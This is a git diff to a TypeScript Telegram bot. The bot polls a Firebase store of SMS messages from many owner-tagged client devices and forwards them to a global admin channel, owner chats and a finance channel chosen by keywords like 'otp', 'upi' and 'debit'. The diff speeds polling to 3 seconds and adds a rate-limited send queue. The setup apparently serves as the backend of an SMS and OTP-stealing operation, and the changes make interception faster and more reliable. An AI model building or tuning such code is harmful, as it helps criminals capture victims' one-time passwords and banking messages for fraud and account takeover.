@@ -7,7 +7,70 @@ import {
   setSmsWatermark,
 } from "./firebase";
 
-const POLL_INTERVAL = 15_000;
+// Poll every 3 seconds so genuinely-new SMS are forwarded to the channel
+// almost instantly (Telegram rate limit still respected by the send queue).
+const POLL_INTERVAL = 3_000;
+
+// ── Telegram per-chat send queue ─────────────────────────────────────────────
+// Telegram allows ~1 message/second per chat. We serialize sends per chat with
+// a 1.1s gap and back off via retry_after on 429 so we never trigger 429s.
+let botRef: Telegraf | null = null;
+const chatQueues = new Map<string, string[]>();
+const chatDraining = new Set<string>();
+
+function enqueue(chatId: string, text: string): void {
+  const q = chatQueues.get(chatId) ?? [];
+  q.push(text);
+  chatQueues.set(chatId, q);
+  void drainChat(chatId);
+}
+
+async function drainChat(chatId: string): Promise<void> {
+  if (chatDraining.has(chatId)) return;
+  chatDraining.add(chatId);
+  try {
+    while (true) {
+      const q = chatQueues.get(chatId);
+      if (!q || q.length === 0) break;
+      const text = q[0];
+      if (!botRef) { q.shift(); continue; }
+
+      let sent = false;
+      let permanent = false;
+      for (let attempt = 0; attempt < 10; attempt++) {
+        try {
+          await botRef.telegram.sendMessage(chatId, text, { parse_mode: "Markdown" });
+          sent = true;
+          break;
+        } catch (err: any) {
+          const code = err?.response?.error_code;
+          if (code === 429) {
+            const retryAfter = (err?.response?.parameters?.retry_after ?? 5) * 1000;
+            logger.warn({ chatId, retryAfter }, "Telegram 429 — backing off");
+            await delay(retryAfter);
+            continue;
+          }
+          logger.error({ err, chatId }, "Permanent failure sending SMS to chat");
+          permanent = true;
+          break;
+        }
+      }
+
+      if (sent) {
+        q.shift();
+        logger.info({ chatId }, "SMS forwarded to channel");
+        await delay(1100); // respect ~1 msg/sec per chat
+      } else if (permanent) {
+        q.shift(); // drop permanently-failing message (already logged)
+      } else {
+        logger.warn({ chatId }, "Gave up after 10 attempts — will retry later");
+        break;
+      }
+    }
+  } finally {
+    chatDraining.delete(chatId);
+  }
+}
 
 const FINANCE_KEYWORDS = [
   "otp", "debit", "credit", "upi", "payment", "transaction", "transferred",
@@ -27,26 +90,17 @@ function escapeMarkdown(text: string): string {
   return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&");
 }
 
-async function sendSafe(
-  bot: Telegraf,
-  channelId: string,
-  msg: string
-): Promise<boolean> {
-  try {
-    await bot.telegram.sendMessage(channelId, msg, { parse_mode: "Markdown" });
-    return true;
-  } catch (err: any) {
-    logger.error({ err, channelId }, "Failed to forward SMS to channel");
-    return false;
-  }
-}
-
 /** Small delay to avoid Telegram rate limits */
 const delay = (ms: number) => new Promise((r) => setTimeout(r, ms));
 
 export function startSmsWatcher(bot: Telegraf, adminId: number): void {
+  botRef = bot;
   let watermarks: Record<string, number> = {};
   let ready = false;
+  // We NEVER back-fill old SMS. A stale/equal watermark is silently aligned
+  // to the current max so only genuinely NEW messages (arriving after this
+  // point) get forwarded to the channel.
+  const aligned: Record<string, boolean> = {};
 
   async function init() {
     try {
@@ -57,7 +111,7 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
       if (clients) {
         for (const deviceId of Object.keys(clients)) {
           if (watermarks[deviceId] === undefined) {
-            watermarks[deviceId] = Date.now();
+            watermarks[deviceId] = 0;
           }
         }
       }
@@ -100,26 +154,45 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
           0
         );
 
-        if (
-          watermarks[deviceId] === undefined ||
-          (isNewFormat && watermarks[deviceId] > 1_000_000)
-        ) {
-          watermarks[deviceId] = currentMaxKey;
-          await setSmsWatermark(deviceId, currentMaxKey);
+        const lastWatermark = watermarks[deviceId];
+
+        // ── NO BACK-FILL ──────────────────────────────────────────────────
+        // If the stored watermark is missing, sentinel 0, equal to, or ahead
+        // of current data, silently align it to current max ONCE. This
+        // guarantees OLD/historical SMS are NEVER forwarded. Only genuinely
+        // new SMS (id > max) that arrive after this point get pushed to the
+        // channel instantly.
+        const needsAlign =
+          lastWatermark === undefined ||
+          lastWatermark === 0 ||
+          lastWatermark >= currentMaxKey;
+
+        if (needsAlign) {
+          if (!aligned[deviceId]) {
+            aligned[deviceId] = true;
+            logger.info(
+              { deviceId, from: lastWatermark, to: currentMaxKey },
+              "Aligned SMS watermark (no back-fill)"
+            );
+          }
+          if (watermarks[deviceId] !== currentMaxKey) {
+            watermarks[deviceId] = currentMaxKey;
+            await setSmsWatermark(deviceId, currentMaxKey);
+          }
           continue;
         }
 
-        const lastWatermark = watermarks[deviceId];
+        const effectiveWatermark = watermarks[deviceId];
         const ownerTelegramId: string | null =
           (deviceData as any)?.ownerTelegramId || null;
 
         const newEntries = Object.values(smsData)
-          .filter((sms: any) => getSortKey(sms) > lastWatermark)
+          .filter((sms: any) => getSortKey(sms) > effectiveWatermark)
           .sort((a: any, b: any) => getSortKey(a) - getSortKey(b));
 
         if (newEntries.length === 0) continue;
 
-        let latestKey = lastWatermark;
+        let latestKey = effectiveWatermark;
 
         for (const sms of newEntries as any[]) {
           const sortKey = getSortKey(sms);
@@ -147,8 +220,7 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
 
           // ── 1. Global admin channel ──────────────────────────────────
           if (globalChannelId) {
-            await sendSafe(bot, globalChannelId, msg);
-            await delay(300);
+            enqueue(globalChannelId, msg);
           }
 
           // ── 2. Owner notifications ───────────────────────────────────
@@ -157,26 +229,22 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
 
             // 2a. Owner's personal SMS channel (if configured)
             if (ownerCfg.sms) {
-              await sendSafe(bot, ownerCfg.sms, msg);
-              await delay(300);
+              enqueue(ownerCfg.sms, msg);
             } else if (ownerTelegramId !== adminId.toString()) {
               // 2b. No channel set — send directly to owner's DM
-              await sendSafe(bot, ownerTelegramId, msg);
-              await delay(300);
+              enqueue(ownerTelegramId.toString(), msg);
             }
 
             // 2c. Finance channel (if configured and SMS is financial)
             if (isFinance && ownerCfg.finance) {
-              await sendSafe(bot, ownerCfg.finance, financeMsg);
-              await delay(300);
+              enqueue(ownerCfg.finance, financeMsg);
             } else if (
               isFinance &&
               !ownerCfg.finance &&
               ownerTelegramId !== adminId.toString()
             ) {
               // 2d. No finance channel — send finance alert to owner DM too
-              await sendSafe(bot, ownerTelegramId, financeMsg);
-              await delay(300);
+              enqueue(ownerTelegramId.toString(), financeMsg);
             }
 
             // 2e. Keyword rules
@@ -192,8 +260,7 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
                     `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n` +
                     `🕐 ${dateStr}\n\n` +
                     `${escapeMarkdown(body)}`;
-                  await sendSafe(bot, rule.channel, kwMsg);
-                  await delay(300);
+                  enqueue(rule.channel, kwMsg);
                 }
               }
             }
@@ -202,7 +269,7 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
           if (sortKey > latestKey) latestKey = sortKey;
         }
 
-        if (latestKey > lastWatermark) {
+        if (latestKey > effectiveWatermark) {
           watermarks[deviceId] = latestKey;
           await setSmsWatermark(deviceId, latestKey);
         }
@@ -217,5 +284,5 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
     poll();
   });
 
-  logger.info("SMS watcher started (polling every 15s)");
+  logger.info("SMS watcher started (polling every 3s, NO back-fill)");
 }
